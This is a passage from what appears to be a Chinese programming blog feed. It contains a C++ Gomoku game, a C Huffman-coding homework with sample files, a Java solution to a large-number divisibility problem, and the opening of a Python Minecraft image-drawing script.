class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (msg.y % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (Play(msg.x / <span class="number">40</span> + <span class="number">1</span>, msg.y / <span class="number">40</span> + <span class="number">1</span>, turn % <span class="number">2</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">						<span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">						AI();</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GamePeople</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	key = <span class="literal">true</span>;</span><br><span class="line">	<span class="built_in">memset</span>(pos, <span class="number">0</span>, <span class="keyword">sizeof</span>(pos));</span><br><span class="line">	<span class="keyword">int</span> turn = <span class="number">0</span>;</span><br><span class="line">	mouse_msg msg;</span><br><span class="line">	<span class="keyword">for</span> (; is_run();)</span><br><span class="line">	&#123;</span><br><span class="line">		msg = getmouse();</span><br><span class="line">		<span class="keyword">if</span> (msg.is_up())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (msg.x % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (msg.y % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (Play(msg.x / <span class="number">40</span>, msg.y / <span class="number">40</span>, turn % <span class="number">2</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (msg.y % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (Play(msg.x / <span class="number">40</span>, msg.y / <span class="number">40</span> + <span class="number">1</span>, turn % <span class="number">2</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (msg.x % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (msg.y % <span class="number">40</span> &lt; <span class="number">20</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (Play(msg.x / <span class="number">40</span> + <span class="number">1</span>, msg.y / <span class="number">40</span>, turn % <span class="number">2</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (msg.y % <span class="number">40</span> &gt; <span class="number">20</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (Play(msg.x / <span class="number">40</span> + <span class="number">1</span>, msg.y / <span class="number">40</span> + <span class="number">1</span>, turn % <span class="number">2</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						turn++;</span><br><span class="line">						Counter(turn);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (Checker())<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setcolor(EGERGB(<span class="number">255</span>, <span class="number">45</span>, <span class="number">50</span>));</span><br><span class="line">	setfont(<span class="number">130</span>, <span class="number">0</span>, <span class="string">&quot;华文新魏&quot;</span>);</span><br><span class="line">	xyprintf(<span class="number">150</span>, <span class="number">60</span>, <span class="string">&quot;五  子  棋&quot;</span>);</span><br><span class="line">	setbkcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>));</span><br><span class="line">	setfillcolor(EGERGB(<span class="number">0</span>, <span class="number">122</span>, <span class="number">204</span>));</span><br><span class="line">	bar(<span class="number">300</span>, <span class="number">230</span>, <span class="number">500</span>, <span class="number">280</span>);</span><br><span class="line">	bar(<span class="number">300</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">350</span>);</span><br><span class="line">	bar(<span class="number">300</span>, <span class="number">370</span>, <span class="number">500</span>, <span class="number">420</span>);</span><br><span class="line">	setbkmode(TRANSPARENT);</span><br><span class="line">	setfont(<span class="number">40</span>, <span class="number">15</span>, <span class="string">&quot;华文楷体&quot;</span>);</span><br><span class="line">	setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">	setfontbkcolor(EGERGB(<span class="number">30</span>, <span class="number">30</span>, <span class="number">130</span>));</span><br><span class="line">	outtextxy(<span class="number">320</span>, <span class="number">235</span>, <span class="string">&quot;人机对战&quot;</span>);</span><br><span class="line">	outtextxy(<span class="number">320</span>, <span class="number">305</span>, <span class="string">&quot;好友对战&quot;</span>);</span><br><span class="line">	outtextxy(<span class="number">320</span>, <span class="number">375</span>, <span class="string">&quot;退出游戏&quot;</span>);</span><br><span class="line">	setfont(<span class="number">30</span>, <span class="number">0</span>, <span class="string">&quot;华文楷体&quot;</span>);</span><br><span class="line">	outtextxy(<span class="number">230</span>, <span class="number">480</span>, <span class="string">&quot;制作人：计实验17-1郭永航&quot;</span>);</span><br><span class="line">	setfont(<span class="number">20</span>, <span class="number">0</span>, <span class="string">&quot;方正舒体&quot;</span>);</span><br><span class="line">	setcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	outtextxy(<span class="number">190</span>, <span class="number">600</span>, <span class="string">&quot;Copyright (C) 2018 Gomoku. All Rights Reserved.&quot;</span>);</span><br><span class="line">	mouse_msg msg;</span><br><span class="line">	<span class="keyword">for</span> (; is_run();)</span><br><span class="line">	&#123;</span><br><span class="line">		msg = getmouse();</span><br><span class="line">		<span class="keyword">if</span> (msg.is_up())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (msg.x &gt;= <span class="number">300</span> &amp;&amp; msg.x &lt;= <span class="number">500</span> &amp;&amp; msg.y &gt;= <span class="number">230</span> &amp;&amp; msg.y &lt;= <span class="number">280</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				cleardevice();</span><br><span class="line">				ChessBoard();</span><br><span class="line">				GameAI();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (msg.x &gt;= <span class="number">300</span> &amp;&amp; msg.x &lt;= <span class="number">500</span> &amp;&amp; msg.y &gt;= <span class="number">300</span> &amp;&amp; msg.y &lt;= <span class="number">350</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				cleardevice();</span><br><span class="line">				ChessBoard();</span><br><span class="line">				GamePeople();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (msg.x &gt;= <span class="number">300</span> &amp;&amp; msg.x &lt;= <span class="number">500</span> &amp;&amp; msg.y &gt;= <span class="number">370</span> &amp;&amp; msg.y &lt;= <span class="number">420</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				closegraph();</span><br><span class="line">				<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Choice</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setfillcolor(EGERGB(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	bar(<span class="number">10</span>, <span class="number">150</span>, <span class="number">90</span>, <span class="number">180</span>);</span><br><span class="line">	bar(<span class="number">10</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">230</span>);</span><br><span class="line">	setcolor(EGERGB(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">	setfont(<span class="number">20</span>, <span class="number">0</span>, <span class="string">&quot;宋体&quot;</span>);</span><br><span class="line">	xyprintf(<span class="number">10</span>, <span class="number">155</span>, <span class="string">&quot;再来一局&quot;</span>);</span><br><span class="line">	xyprintf(<span class="number">10</span>, <span class="number">205</span>, <span class="string">&quot;返回菜单&quot;</span>);</span><br><span class="line">	mouse_msg msg;</span><br><span class="line">	<span class="keyword">for</span> (; is_run();)</span><br><span class="line">	&#123;</span><br><span class="line">		msg = getmouse();</span><br><span class="line">		<span class="keyword">if</span> (msg.is_up())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (msg.x &gt;= <span class="number">10</span> &amp;&amp; msg.x &lt;= <span class="number">90</span> &amp;&amp; msg.y &gt;= <span class="number">150</span> &amp;&amp; msg.y &lt;= <span class="number">180</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				cleardevice();</span><br><span class="line">				ChessBoard();</span><br><span class="line">				<span class="keyword">if</span> (key)GamePeople();</span><br><span class="line">				<span class="keyword">else</span> GameAI();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (msg.x &gt;= <span class="number">10</span> &amp;&amp; msg.x &lt;= <span class="number">90</span> &amp;&amp; msg.y &gt;= <span class="number">200</span> &amp;&amp; msg.y &lt;= <span class="number">230</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				cleardevice();</span><br><span class="line">				<span class="keyword">if</span> (Menu())<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setinitmode(INIT_RENDERMANUAL);</span><br><span class="line">	initgraph(<span class="number">800</span>, <span class="number">640</span>);</span><br><span class="line">	setcaption(<span class="string">&quot;五子棋&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (Menu())<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (!Choice());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>C++</category>
      </categories>
      <tags>
        <tag>GUI</tag>
      </tags>
  </entry>
  <entry>
    <title>哈夫曼编码</title>
    <url>/post/49558830/</url>
    <content><![CDATA[<h1 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id="more"></a><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> key[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> weight;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> parent,LChild,RChild;</span><br><span class="line">&#125;HTNode,*HuffmanTree;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> *HuffmanCode;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Select</span><span class="params">(HuffmanTree *ht,<span class="keyword">int</span> n,<span class="keyword">int</span> *s1,<span class="keyword">int</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,min;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>((*ht)[i].parent==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			min=i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>((*ht)[i].parent==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>((*ht)[i].weight&lt;(*ht)[min].weight)</span><br><span class="line">				min=i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	*s1=min;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>((*ht)[i].parent==<span class="number">0</span>&amp;&amp;i!=(*s1))</span><br><span class="line">		&#123;</span><br><span class="line">			min=i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>((*ht)[i].parent==<span class="number">0</span>&amp;&amp;i!=*s1)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>((*ht)[i].weight&lt;(*ht)[min].weight)</span><br><span class="line">				min=i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	*s2=min;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CrtHuffmanTree</span><span class="params">(HuffmanTree *ht,<span class="keyword">int</span> *w,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m=<span class="number">2</span>*n<span class="number">-1</span>,i,s1,s2;</span><br><span class="line">	*ht	=(HuffmanTree) <span class="built_in">malloc</span>((m+<span class="number">1</span>)*<span class="keyword">sizeof</span>(HTNode));</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		(*ht)[i].weight=w[i];</span><br><span class="line">		(*ht)[i].LChild=<span class="number">0</span>;</span><br><span class="line">		(*ht)[i].parent=<span class="number">0</span>;</span><br><span class="line">		(*ht)[i].RChild=<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=n+<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		(*ht)[i].weight=<span class="number">0</span>;</span><br><span class="line">		(*ht)[i].LChild=<span class="number">0</span>;</span><br><span class="line">		(*ht)[i].parent=<span class="number">0</span>;</span><br><span class="line">		(*ht)[i].RChild=<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp=fopen(<span class="string">&quot;Code.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(fp,<span class="string">&quot;哈夫曼树为: \n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=n+<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Select(ht,i<span class="number">-1</span>,&amp;s1,&amp;s2);</span><br><span class="line">		(*ht)[s1].parent=i;</span><br><span class="line">		(*ht)[s2].parent=i;</span><br><span class="line">		(*ht)[i].LChild=s1;</span><br><span class="line">		(*ht)[i].RChild=s2;</span><br><span class="line">		(*ht)[i].weight=(*ht)[s1].weight +(*ht)[s2].weight;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d(%d,%d)\n&quot;</span>,(*ht)[i].weight,(*ht)[s1].weight,(*ht)[s2].weight);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fprintf</span>(fp,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CrtHuffmanCode</span><span class="params">(HuffmanTree *ht,HuffmanCode *hc,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *cd;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">int</span> i,start,p,w=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> c;</span><br><span class="line">	hc=(HuffmanCode *)<span class="built_in">malloc</span>((n+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">	cd=(<span class="keyword">char</span> *) <span class="built_in">malloc</span>(n*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">	cd[n<span class="number">-1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a[i]=<span class="number">0</span>;</span><br><span class="line">		start=n - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(c=i,p=(*ht)[i].parent;p != <span class="number">0</span>;c=p,p=(*ht)[p].parent)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>((*ht)[p].LChild==c)</span><br><span class="line">			&#123;</span><br><span class="line">				cd[--start]=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">				a[i]++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				cd[--start]=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">				a[i]++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		hc[i]=(<span class="keyword">char</span> *) <span class="built_in">malloc</span>((n - start)*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">		<span class="built_in">strcpy</span>(hc[i],&amp;cd[start]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(cd);</span><br><span class="line">	FILE *fp,*sf,*rf;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	fp=fopen(<span class="string">&quot;Code.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;权值为%d的字母%c的哈夫曼编码为：%s\n&quot;</span>,(*ht)[i].weight,key[i],hc[i]);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">		w+=(*ht)[i].weight*a[i];</span><br><span class="line">	<span class="built_in">fprintf</span>(fp,<span class="string">&quot;带权路径为：%d\n&quot;</span>,w);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	sf=fopen(<span class="string">&quot;SourceFile.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	rf=fopen(<span class="string">&quot;ResultFile.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">fscanf</span>(sf,<span class="string">&quot;%c&quot;</span>,&amp;ch)!=EOF)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(key[i]==ch)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">fprintf</span>(rf,<span class="string">&quot;%s&quot;</span>,hc[i]);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(sf);</span><br><span class="line">	fclose(rf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HuffmanTree	HT;</span><br><span class="line">	HuffmanCode	HC;</span><br><span class="line">	<span class="keyword">int</span> *w,i,N=<span class="number">0</span>,S[<span class="number">200</span>],k=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="built_in">memset</span>(S,<span class="number">0</span>,<span class="keyword">sizeof</span>(S));</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp=fopen(<span class="string">&quot;SourceFile.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%c&quot;</span>,&amp;ch)!=EOF)S[ch]++;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="string">&#x27;A&#x27;</span>;i&lt;=<span class="string">&#x27;Z&#x27;</span>;i++)<span class="keyword">if</span>(S[i])N++;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	w=(<span class="keyword">int</span> *)<span class="built_in">malloc</span>((N+<span class="number">1</span>)*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="string">&#x27;A&#x27;</span>;i&lt;=<span class="string">&#x27;Z&#x27;</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(S[i])</span><br><span class="line">		&#123;</span><br><span class="line">			key[++k]=i;</span><br><span class="line">			w[k]=S[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	CrtHuffmanTree(&amp;HT,w,N);</span><br><span class="line">	CrtHuffmanCode(&amp;HT,&amp;HC,N);</span><br><span class="line">	<span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br/><br><strong>SourceFile.txt</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AAAAABBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCDDDDDDDDEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFGGGHHHHHHHHHHH</span><br></pre></td></tr></table></figure><br><br/><br><strong>Code.txt</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">哈夫曼树为: </span><br><span class="line">8(3,5)</span><br><span class="line">15(7,8)</span><br><span class="line">19(8,11)</span><br><span class="line">29(14,15)</span><br><span class="line">40(19,21)</span><br><span class="line">54(25,29)</span><br><span class="line">94(40,54)</span><br><span class="line"></span><br><span class="line">权值为5的字母A的哈夫曼编码为：0001</span><br><span class="line">权值为25的字母B的哈夫曼编码为：10</span><br><span class="line">权值为7的字母C的哈夫曼编码为：1110</span><br><span class="line">权值为8的字母D的哈夫曼编码为：1111</span><br><span class="line">权值为14的字母E的哈夫曼编码为：110</span><br><span class="line">权值为21的字母F的哈夫曼编码为：01</span><br><span class="line">权值为3的字母G的哈夫曼编码为：0000</span><br><span class="line">权值为11的字母H的哈夫曼编码为：001</span><br><span class="line">带权路径为：259</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><br/><br><strong>ResultFile.txt</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0001000100010001000110101010101010101010101010101010101010101010101010111011101110111011101110111011111111111111111111111111111111110110110110110110110110110110110110110110010101010101010101010101010101010101010101000000000000001001001001001001001001001001001</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>哈夫曼编码</tag>
      </tags>
  </entry>
  <entry>
    <title>Large Division</title>
    <url>/post/e17037ac/</url>
    <content><![CDATA[<h1 id="Descript"><a href="#Descript" class="headerlink" title="Descript"></a>Descript</h1><blockquote><p>Given two integers, a and b, you should check whether a is divisible by b or not. We know that an integer a is divisible by an integer b if and only if there exists an integer c such that a = b * c.</p>
</blockquote>
<a id="more"></a>
<h1 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h1><blockquote><p>Input starts with an integer T (≤ 525), denoting the number of test cases.</p>
<p>Each case starts with a line containing two integers a (-10200 ≤ a ≤ 10200) and b (|b| &gt; 0, b fits into a 32 bit signed integer). Numbers will not contain leading zeroes.</p>
</blockquote>
<h1 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h1><blockquote><p>For each case, print the case number first. Then print ‘divisible’ if a is divisible by b. Otherwise print ‘not divisible’.</p>
</blockquote>
<h1 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6</span><br><span class="line">101 101</span><br><span class="line">0 67</span><br><span class="line">-101 101</span><br><span class="line">7678123668327637674887634 101</span><br><span class="line">11010000000000000000 256</span><br><span class="line">-202202202202000202202202 -101</span><br></pre></td></tr></table></figure>
<h1 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Case 1: divisible</span><br><span class="line">Case 2: divisible</span><br><span class="line">Case 3: divisible</span><br><span class="line">Case 4: not divisible</span><br><span class="line">Case 5: divisible</span><br><span class="line">Case 6: divisible</span><br></pre></td></tr></table></figure>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><p><strong>java暴力代码</strong><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		BigInteger a,b;</span><br><span class="line">		Integer T = sc.nextInt(),k=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>(T--&gt;<span class="number">0</span>)&#123;</span><br><span class="line">			a = sc.nextBigInteger();</span><br><span class="line">			b = sc.nextBigInteger();</span><br><span class="line">			a = a.abs();</span><br><span class="line">			b = b.abs();</span><br><span class="line">			System.out.print(<span class="string">&quot;Case &quot;</span> + k++ +<span class="string">&quot;: &quot;</span>);</span><br><span class="line">			<span class="keyword">if</span>(a.mod(b) == BigInteger.valueOf(<span class="number">0</span>))System.out.println(<span class="string">&quot;divisible&quot;</span>);</span><br><span class="line">			<span class="keyword">else</span> System.out.println(<span class="string">&quot;not divisible&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>同余定理</tag>
      </tags>
  </entry>
  <entry>
    <title>Minecraft Python绘图</title>
    <url>/post/566b0d1e/</url>
    <content><![CDATA[<p><font color="red">前置条件：</font></p>
<blockquote>
<p>模组: RaspberryJamMod<br>Python库: mcpi<br>游戏版本: 1.8 ~ 1.12.2</p>
</blockquote>
<a id="more"></a>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> mcpi <span class="keyword">import</span> minecraft, block</span><br><span class="line"><span class="keyword">from</span> colorsys <span class="keyword">import</span> rgb_to_hsv</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"></span><br><span class="line">colors = dict((</span><br><span class="line">    ((<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="string">&quot;0&quot;</span>), <span class="comment"># white 白色</span></span><br><span class="line">    ((<span class="number">249</span>, <span class="number">255</span>, <span class="number">254</span>), <span class="string">&quot;0&quot;</span>),  <span class="comment"># white 白色</span></span><br><span class="line">    ((<span class="number">249</span>, <span class="number">128</span>, <span class="number">29</span>), <span class="string">&quot;1&quot;</span>),  <span class="comment"># orange 橙色</span></span><br><span class="line">    ((<span class="number">199</span>, <span class="number">78</span>, <span class="number">189</span>), <span class="string">&quot;2&quot;</span>),  <span class="comment"># magenta 品红色</span></span><br><span class="line">    ((<span class="number">58</span>, <span class="number">179</span>, <span class="number">218</span>), <span class="string">&quot;3&quot;</span>),  <span class="comment"># 